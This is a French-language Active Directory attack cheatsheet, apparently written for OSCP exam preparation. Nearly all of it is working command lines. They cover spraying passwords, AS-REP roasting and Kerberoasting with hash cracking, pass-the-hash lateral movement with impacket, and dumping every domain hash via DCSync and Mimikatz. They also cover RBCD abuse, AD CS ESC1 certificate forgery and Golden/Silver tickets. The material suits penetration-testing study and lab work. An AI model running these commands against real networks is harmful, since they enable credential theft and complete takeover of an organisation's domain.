# 🟣 Active Directory — Cheatsheet OSCP

## Workflow AD (ordre type)

```
1. Accès initial (user:pass ou hash quelconque)
2. Enum via NXC/crackmapexec + LDAP
3. BloodHound (collecte SharpHound + analyse)
4. Kerberos attacks (AS-REP roast, Kerberoast)
5. Lateral movement (PsExec, WMIExec, WinRM)
6. Dump SAM/NTDS via DCSync ou secretsdump
7. Golden / Silver / DCSync
```

---

## 1. Enumeration sans credentials

```bash
# Nmap d'un DC typique : 53, 88, 135, 139, 389, 445, 464, 636, 593, 3268, 3269, 5985
nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985 DC_IP

# Null session SMB (rarement)
nxc smb DC_IP -u '' -p ''
enum4linux-ng -A DC_IP

# LDAP anonyme
ldapsearch -x -H ldap://DC_IP -b "DC=example,DC=com" -s sub "(objectclass=*)"

# Users via Kerberos (sans password)
./kerbrute userenum -d EXAMPLE.COM --dc DC_IP users.txt

# RPC null bind (chance vieux DC)
rpcclient -U "" -N DC_IP
> enumdomusers
> enumdomgroups
> querydispinfo

# Zone DNS transfer
dig axfr example.com @DC_IP
```

## 2. Avec credentials low-priv (user:pass)

```bash
# Check validité sur tout le range
nxc smb 10.10.10.0/24 -u USER -p PASS

# SMB : shares, users, sessions
nxc smb DC_IP -u USER -p PASS --shares --users --sessions --groups --loggedon-users

# Pass-spray (1 password sur tous les users)
nxc smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success

# LDAP bind
ldapsearch -x -H ldap://DC_IP -D 'USER@EXAMPLE.COM' -w PASS \
  -b "DC=example,DC=com" "(&(objectclass=user))" sAMAccountName

# Kerberos tickets valides ?
./impacket-getTGT example.com/USER:PASS

# BloodHound collect (Python, depuis Linux)
bloodhound-python -d example.com -u USER -p PASS -ns DC_IP -c all
# Ou depuis Windows
.\SharpHound.exe -c All,GPOLocalGroup
```

## 3. Kerberos attacks

### AS-REP Roasting (users avec `DONT_REQ_PREAUTH`)

```bash
# Avec un user-list (sans creds !)
impacket-GetNPUsers example.com/ -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile hashes.txt
# Avec creds (pour trouver les users vulnérables)
impacket-GetNPUsers example.com/USER:PASS -request -dc-ip DC_IP

# Crack
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep hashes.txt --wordlist=rockyou.txt
```

### Kerberoasting (SPN)

```bash
# Liste les SPN + tickets
impacket-GetUserSPNs example.com/USER:PASS -dc-ip DC_IP -request -outputfile tgs.txt

# Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs tgs.txt --wordlist=rockyou.txt

# Sans user-list (si on a un compte low-priv)
impacket-GetUserSPNs example.com/USER:PASS -dc-ip DC_IP -request -target-domain example.com
```

### Pass-the-Hash / Pass-the-Ticket

```bash
# NXC avec NTLM
nxc smb DC_IP -u USER -H 'aad3b435b51404eeaad3b435b51404ee:...'

# WinRM
evil-winrm -i TARGET -u USER -H NTHASH

# psexec / wmiexec / smbexec
impacket-psexec example.com/USER@TARGET -hashes LM:NT
impacket-wmiexec example.com/USER@TARGET -hashes LM:NT
impacket-smbexec example.com/USER@TARGET -hashes LM:NT

# Pass the Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass example.com/USER@TARGET
```

## 4. BloodHound — queries essentielles

Interface → onglet "Analysis" ou custom Cypher :

```cypher
// Users Kerberoastable
MATCH (u:User {hasspn:true}) RETURN u

// Users AS-REP vulnérables
MATCH (u:User {dontreqpreauth:true}) RETURN u

// Chemins vers Domain Admin depuis un user
MATCH p = shortestPath((u:User {name:"USER@EXAMPLE.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@EXAMPLE.COM"}))
RETURN p

// Users avec contrôle sur d'autres users
MATCH p = (u1:User)-[:GenericAll|WriteDacl|WriteOwner|Owns|AllExtendedRights]->(u2:User)
RETURN p

// GPOs éditables par nous
MATCH (u:User {name:"USER@EXAMPLE.COM"})-[:MemberOf*0..]->(g)-[:GenericAll|GenericWrite]->(gpo:GPO)
RETURN gpo
```

Workflow type : "Shortest Paths to Domain Admins from Owned Principals".

## 5. Abuses classiques

### DCSync (creds → tous les hashes NTDS)

Requiert `Replicating Directory Changes` ACL.

```bash
impacket-secretsdump example.com/USER:PASS@DC_IP
impacket-secretsdump -just-dc example.com/USER:PASS@DC_IP

# Avec NTLM
impacket-secretsdump example.com/USER@DC_IP -hashes LM:NT -just-dc-ntlm
```

### WriteOwner / GenericAll sur un user

```bash
# Prendre ownership puis changer le password
impacket-addcomputer example.com/USER:PASS -computer-name 'NEWMACHINE$' -computer-pass 'P@ssw0rd' -dc-ip DC_IP
# Changer le mdp d'un user si on a ForceChangePassword :
net rpc password TARGETUSER 'NewP@ss1!' -U 'DOMAIN\USER%PASS' -S DC_IP

# Depuis Windows (PowerView)
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
```

### ACL : GenericWrite sur un user

```powershell
# Forcer un SPN pour ensuite Kerberoast
Set-DomainObject -Identity TARGETUSER -SET @{serviceprincipalname='fake/spn'}
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# Si on a GenericWrite sur un ordinateur + un compte machine créé :
impacket-addcomputer example.com/USER:PASS -computer-name 'ATTACK$' -computer-pass 'P@ss123' -dc-ip DC_IP

# Modifier msDS-AllowedToActOnBehalfOfOtherIdentity sur la cible
impacket-rbcd example.com/USER:PASS -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write

# S4U2Self + S4U2Proxy
impacket-getST example.com/'ATTACK$':P@ss123 -spn cifs/target.example.com -impersonate administrator -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@target.example.com
```

### AD CS (ESC1 — ESC8)

```bash
# Énumérer templates vulnérables
certipy find -u USER@example.com -p PASS -dc-ip DC_IP

# ESC1 : template avec "Enrollee Supplies Subject" + client auth
certipy req -u USER@example.com -p PASS -ca EXAMPLE-CA -target ca.example.com -template VulnTemplate -upn administrator@example.com

# Authentifier avec le cert
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

## 6. Mimikatz — arsenal

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::pth /user:admin /domain:example.com /ntlm:<hash> /run:"cmd.exe"
lsadump::sam
lsadump::secrets
lsadump::dcsync /domain:example.com /user:krbtgt
lsadump::lsa /patch
kerberos::list
kerberos::ptt ticket.kirbi
```

## 7. Golden / Silver Ticket

```
# Golden (besoin du hash krbtgt)
kerberos::golden /domain:example.com /sid:S-1-5-21-... /rc4:<krbtgt_ntlm> /user:Administrator /ptt

# Silver (besoin du hash d'un compte service / machine)
kerberos::golden /domain:example.com /sid:S-1-5-21-... /rc4:<service_ntlm> /user:Administrator /target:srv.example.com /service:cifs /ptt
```

## Outils rapides

| Outil | Usage |
|---|---|
| `nxc` / `crackmapexec` | Swiss army knife SMB/MSSQL/LDAP/WinRM |
| `impacket-*` | psexec, wmiexec, secretsdump, getTGT, getST, GetNPUsers, GetUserSPNs |
| `bloodhound-python` | Collecte depuis Linux |
| `rubeus` | Kerberos depuis Windows |
| `certipy` | AD CS (ESC1-8) |
| `kerbrute` | Brute users via Kerberos |
| `evil-winrm` | Shell WinRM confortable |
| `ldapdomaindump` | Dump LDAP complet |

## Commandes d'or à retenir

```bash
# Le one-liner "je viens d'arriver sur un DC avec des creds"
nxc smb DC_IP -u U -p P --shares --users --groups --loggedon-users
impacket-GetNPUsers example.com/U:P -request -dc-ip DC_IP -outputfile asrep.txt
impacket-GetUserSPNs example.com/U:P -request -dc-ip DC_IP -outputfile tgs.txt
bloodhound-python -d example.com -u U -p P -ns DC_IP -c all

# Le "je pense que c'est fini" → DCSync
impacket-secretsdump example.com/U:P@DC_IP -just-dc
```

> ⚠ **OSCP** : l'AD set sur l'examen donne 40 points (les 3 machines
> doivent être rootées). Le chemin est souvent guidé : AS-REP ou
> Kerberoast → lateral → DCSync. Pas de 0-day à chercher.
